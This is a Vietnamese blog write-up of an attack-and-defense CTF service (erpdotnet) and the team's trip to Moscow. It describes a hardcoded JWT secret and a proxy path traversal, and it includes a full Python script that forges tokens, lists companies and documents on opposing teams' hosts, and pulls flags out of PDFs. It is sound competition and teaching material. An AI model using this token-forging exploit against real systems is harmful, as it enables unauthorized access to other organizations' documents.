---
title: (Vietnamese) MTUCI Attack & Defense CTF Event at Russia 
date: 2025-12-10 00:00:00 +0007
categories: [Write-up]
tags: [.NET, A&D]

image:
  path: /assets/img/2025-12-10-MoscowCTF/cover.png

description: "My write up for the erpdotnet challenge and my experience in the Russia trip"

---

> Vì khi mình viết bài này thì truy cập lại website cuộc thi đã đóng nên không còn thông tin về mô hình mạng và rules nữa, nhưng nhìn chung thì cũng giống như các cuộc thi A&D CTF thông thường

> Giải này thì họ cấp cho mình một con cloud server, trong đó có sẵn service chỉ cần vào dựng tool và chạy service lên là chiến. Vì là cuộc thi onsite tại Nga, việc set up cho cuộc thi cũng không gặp bất kỳ khó khăn gì như giải saarCTF

## Write up challenge erpdotnet

### Overview

Tổng quan về challenge:
- Frontend được viết bằng TypeScript
- Backend được viết bằng `C# ASP .NET core`, database sử dụng là PostgreSQL
- Những hành động của người dùng trên service sẽ không được request trực tiếp đến backend mà sẽ thông qua middleware là frontend

Để có góc nhìn tổng quan, mình tiến hành build challenge lên bằng docker rồi sử dụng qua một lúc để biết ứng dụng sẽ có những chức năng gì và đưa ra các ý tưởng về việc những chức năng đó đang được thực hiện như thế nào:

- Trang chủ với chức năng đăng ký, đăng nhập

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image1.png" | relative_url }})

- Tiến hành đăng ký một tài khoản, mình có được thông tin hệ thống sử dụng JWT để quản lý việc truy cập và xác thực người dùng

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image2.png" | relative_url }})

- Các chức năng của một người dùng sau khi đăng nhập bao gồm:
    - Chỉnh sửa thông tin về công ty của mình
    - Quản lý nhân sự và quyền truy cập các thông tin
    - Quản lý tài liệu
    - Quản lý sản phẩm

---

### Yapping


Vì là một challenge A&D ra bởi các đội của Nga, một đặc điểm nổi bật là ta không biết flag được giấu ở đâu. Vì vậy trong 1 tiếng đầu các đội chỉ tập trung tìm nhiều bug nhất có thể rồi sau đó khai thác toàn bộ lỗ hổng đó rồi ngồi khấn rằng flag sẽ ở vị trí đấy. 

Khi làm bài này mình đã biết flag được giấu ở các file PDF trong document của các công ty được bot tạo và ném flag vào trong một company ngẫu nhiên nào đó dựa trên log attack vào service mình đọc được, request cuối cùng để get flag sẽ có dạng:

```
/api?company={company_id}&document={doc_id}
```

=> Câu hỏi đầu tiên được đặt ra là làm như nào để mình biết được `company_id` của thằng chứa flag?

Vị trí giúp mình làm điều này là ở `/api/companies`, ta có thể tìm thấy code đề cập tới vấn đề này trong `/backend.Controllers/CompaniesController.cs`. API này call tới method `GetAllAsync()`, đây là method chịu trách nhiệm query tới database và trả về toàn bộ giá trị id và name của table `companies`

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image3.png" | relative_url }})

Thế nhưng như mình đã đề cập, ta không trực tiếp truy cập được vào backend mà phải thông qua frontend. Đọc nội dung file `next.config.ts` mình biết được để gọi API này ở backend thì ta đơn giản là thông qua thằng endpoint `/api` kèm theo một tham số `companies` bất kỳ

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image4.png" | relative_url }})

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image5.png" | relative_url }})

Vậy là bài toán tìm kiếm giá trị `company_id` đã hoàn thành. Dựa vào `company_id`, ta dễ dàng query ra được toàn bộ `document_id` chứa trong company đó, vấn đề là giờ từ `company_id`, liệu ta đã có thể đọc được các document trong company khác không? 

Thì đoạn này trong giải mình thử ngay `BAC` bằng tay thay vì đọc source cho đỡ tốn thời gian, nhưng để có minh chứng rõ ràng hơn cho write-up thì ta có thể nhìn vào hình bên dưới đây:

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image6.png" | relative_url }})

Vậy là phân quyền rất chuẩn, vì vậy từ một company A ta không thể truy cập vào document của company B. Giá trị được lấy ra kiểm tra là `company_id` trong JWT, vì vậy ta vẫn chưa thể đạt được mục đích ban đầu

Đọc kỹ lại một lượt thì ta sẽ nhận ra secret key của JWT đang được hardcode ở trong `backend/appsettings.json`, tới đây vấn đề đã được giải quyết. Flow khai thác đầy đủ sẽ là:
- Tạo một tài khoản ngẫu nhiên trên service này
- Query lấy toàn bộ giá trị `company_id`
- Tìm được đúng `company_id` mong muốn
- Forge JWT token dựa trên hardcoded secret key
- Sử dụng JWT forged để query toàn bộ `document_id`
- Đọc document tìm flag

---

Vậy là có thể khẳng định challenge này không hề khó, nhưng vì số lượng thành viên trong một đội là 4 người nên khi chia việc chắc chắn sẽ có một challenge phải được xác định là bỏ (đọc sau)

Trong cuộc thi này thì đội của mình khá đen khi không ai quen đọc `.NET`, đem 2 ông web đi thì mình và ông kia chia nhau mình đọc PHP, thằng kia đọc Python cái kết là khi đội Nga tấn công được bài `.NET` này, có log khai thác thấy cũng dễ dễ thì mới ngồi trace lại rất hoảng

Sau lần thi đấu tại Nga này cũng để lại cho mình nhiều kinh nghiệm hơn, đội Nga rất biết cách làm khó các đội khác khi vừa chạy script lấy flag từ các đội, vừa chạy các tool khác làm nhiễu log khiến bọn mình đọc rất khó tìm ra cách họ đã giải để làm theo. 

Thậm chí đội bạn còn chắc kèo tới nỗi khi lấy được khoảng tầm 50 - 60 flag và thời gian chỉ còn 1 tiếng, họ đã ngừng chạy script lấy flag mà chỉ tập trung spam làm nhiễu và nặng log làm quá tải các tool defense của đội khác thay vì tiếp tục tấn công để làm lộ ra đường khai thác.

May mắn sao mình vẫn kịp tìm ra cách giải của service này từ đó lấy về 20 flag quý giá chỉ trong 15 phút cuối cùng. Đem về chức vô địch quốc tế lần đầu tiên cho đội tuyển Infosec PTIT và cũng là cho bản thân, vinh dự giương cao lá cờ Việt Nam tại sự kiện `MTUCI Winter School 2025` 

![image]({{ "/assets/img/2025-12-10-MoscowCTF/image7.jpg" | relative_url }})

### Exploit script

```python
import requests
import jwt
import time
import re

SECRET_KEY = "super-secret-development-key-change-me"
TEAM_TOKEN = "TjJlyrx2HVDRkl"
SUBMIT_URL = "http://mctf.ru/flags"

# đội mình ip 5
TARGETS = [
    "http://10.80.3.2",
    "http://10.80.4.2",
    "http://10.80.1.2",
    "http://10.80.2.2",
    "http://10.80.6.2",
    "http://10.80.7.2",
    "http://10.80.8.2",
    "http://10.80.9.2",
]

MAX_COMPANIES = 10

# Forge JWT token, cần đầy đủ các trường trong cái token chuẩn
def create_token(company_id):
    now = int(time.time())
    payload = {
        "sub": "user:f11c8d29-6a5f-48e5-b59b-72bbb4c3695a",
        "iat": now,
        "role": "user",
        "companyId": company_id,
        "nbf": now,
        "exp": now + 3600,
        "iss": "erp.net",
        "aud": "erp.net"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def get_companies(base_url, token):
    try:
        url = f"{base_url}/api?company=../companies&companies=true"
        cookies = {"token": token}
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(url, cookies=cookies, headers=headers, timeout=5)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"  [!] Error: {e}")
    return []

# PUT request submit flag tại endpoint được yêu cầu của BTC http://mctf.ru/flags
# Nếu accepted thì r.body phải có Accepted hoặc OK
# Nếu flag expired thì r.body có Expired
# Còn lại thì là failed to get flag
def submit_flag(flag):
    headers = {
        "Content-Type": "application/json",
        "X-Team-Token": TEAM_TOKEN
    }
    try:
        r = requests.put(SUBMIT_URL, headers=headers, json=[flag], timeout=5)
        result = r.json()
        msg = result[0].get("msg", "?") if result else "?"
        status = "✓" if "Accepted" in msg or "OK" in msg else "✗"
        print(f"    [{status}] {flag} -> {msg}")
        return "Accepted" in msg or "OK" in msg
    except Exception as e:
        print(f"    [!] Submit error: {e}")
        return False

# Lấy toàn bộ documentId
def get_documents(base_url, company_id, token):
    try:
        url = f"{base_url}/api?company={company_id}&documents=true"
        cookies = {"token": token}
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return []

# Flag nằm trong nội dung các file PDF
def read_pdf(base_url, doc_id, token, company_id):
    try:
        url = f"{base_url}/api?company={company_id}&document={doc_id}"
        cookies = {"token": token}
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            pattern = rb'[A-Z0-9]{31}='
            match = re.search(pattern, response.content)
            if match:
                return match.group().decode()
    except:
        pass
    return None

def main():
    # Ăn quả bẫy mấy company đầu toàn flag bị expired => Cần lấy toàn bộ company rồi reverse lại lấy các company mới nhất được bot tạo ra 
    admin_token = create_token(
        "_") 
    all_flags = []
    accepted = 0 
    expired = 0

    for target in TARGETS: 
        print(f"\n[*] {target}")
        companies = get_companies(target,
                                  admin_token)  

        # lấy các company mới nhất
        companies = list(
            reversed(companies)) 
        companies = companies[:MAX_COMPANIES]

        for c in companies:
            cid = c.get('id')
            cname = c.get('name', '?')
            if not cid:
                continue

            print(f"  [*] {cid[:8]}... ({cname})")

            token = create_token(cid)
            docs = get_documents(target, cid, token)

            if not docs:
                continue

            # rev documents
            docs = list(reversed(docs))

            for doc in docs:
                doc_id = doc.get('id')
                if not doc_id:
                    continue

                flag = read_pdf(target, doc_id, token, cid)
                if flag:
                    print(f"  {flag}")
                    all_flags.append(flag)

                    if submit_flag(flag):
                        accepted += 1
                    else:
                        expired += 1
    print(f"  Total flags: {len(all_flags)}")
    print(f"  Accepted: {accepted}")
    print(f"  Expired: {expired}")
    print("=" * 60)


if __name__ == "__main__":
    main()
```

---

### Final Thoughts

Hoàn cảnh của đội mình khi sang Nga tham gia cuộc thi này cũng rất căng. Cả đội vừa may mắn giành chức vô địch bảng A và giải Nhì bảng B cuộc thi Sinh viên An ninh mạng 2025, vì vậy mục tiêu được đặt ra dành cho đội mình từ các thầy lãnh đạo Học viện nghiễm nhiên trở thành vô địch `MTUCI Winter School 2025` hạng mục A&D CTF...

Chưa kể cuộc thi này diễn ra vào ngày 10/12 tại Moscow, Nga và đây cũng là ngày thứ 2 trong chuỗi 7 ngày bọn mình sinh hoạt tại thành phố này, vì vậy có thể nói kết quả của cuộc thi sẽ là yếu tố quyết định tới tâm trạng ăn chơi nhảy múa của cả đội vào những ngày hôm sau, may mắn sao mọi thứ đã kết thúc một cách tốt đẹp!

Cảm ơn mọi người đã đọc tới tận đây! Chúc các bạn một ngày tốt lành :D 

![Ảnh tại Red Square vì sợ mọi người không biết rằng mình đã từng đặt chân tới đây hehe]({{ "/assets/img/2025-12-10-MoscowCTF/image8.jpg" | relative_url }})





